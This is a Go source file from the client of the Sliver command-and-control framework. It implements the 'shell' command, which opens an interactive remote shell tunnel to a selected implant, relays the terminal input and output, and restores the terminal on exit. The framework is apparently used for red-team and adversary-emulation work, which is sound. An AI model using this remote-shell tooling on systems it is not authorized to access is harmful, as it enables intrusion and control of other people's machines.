package command

import (
	"fmt"
	"io"
	"log"
	"os"
	"sliver/client/core"
	sliverpb "sliver/protobuf/sliver"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
	"golang.org/x/crypto/ssh/terminal"
)

const (
	windows = "windows"
)

func shell(ctx *grumble.Context, server *core.SliverServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	if !isUserAnAdult() {
		return
	}

	noPty := ctx.Flags.Bool("no-pty")
	if ActiveSliver.Sliver.OS == windows {
		noPty = true // Windows of course doesn't have PTYs
	}

	fmt.Printf(Info + "Opening shell tunnel (EOF to exit) ...\n\n")

	tunnel, err := server.CreateTunnel(ActiveSliver.Sliver.ID, defaultTimeout)
	if err != nil {
		log.Printf(Warn+"%s", err)
		return
	}

	shellReqData, _ := proto.Marshal(&sliverpb.ShellReq{
		SliverID:  ActiveSliver.Sliver.ID,
		EnablePTY: !noPty,
		TunnelID:  tunnel.ID,
	})
	resp := <-server.RPC(&sliverpb.Envelope{
		Type: sliverpb.MsgShellReq,
		Data: shellReqData,
	}, defaultTimeout)
	if resp.Err != "" {
		fmt.Printf(Warn+"Error: %s", resp.Err)
		return
	}

	var oldState *terminal.State
	if !noPty {
		oldState, err = terminal.MakeRaw(0)
		log.Printf("Saving terminal state: %v", oldState)
		if err != nil {
			fmt.Printf(Warn + "Failed to save terminal state")
			return
		}
	}

	readBuf := make([]byte, 128)

	cleanup := func() {
		log.Printf("[client] cleanup tunnel %d", tunnel.ID)
		tunnelClose, _ := proto.Marshal(&sliverpb.ShellReq{
			TunnelID: tunnel.ID,
		})
		server.RPC(&sliverpb.Envelope{
			Type: sliverpb.MsgTunnelClose,
			Data: tunnelClose,
		}, defaultTimeout)
		if !noPty {
			log.Printf("Restoring old terminal state: %v", oldState)
			terminal.Restore(0, oldState)
		}
	}

	go func() {
		defer cleanup()
		for data := range tunnel.Recv {
			log.Printf("[write] %v", string(data))
			os.Stdout.Write(data)
		}
	}()

	for {
		n, err := os.Stdin.Read(readBuf)
		if err == io.EOF {
			break
		}
		if err == nil && 0 < n {
			tunnel.Send(readBuf[:n])
		}
	}
}
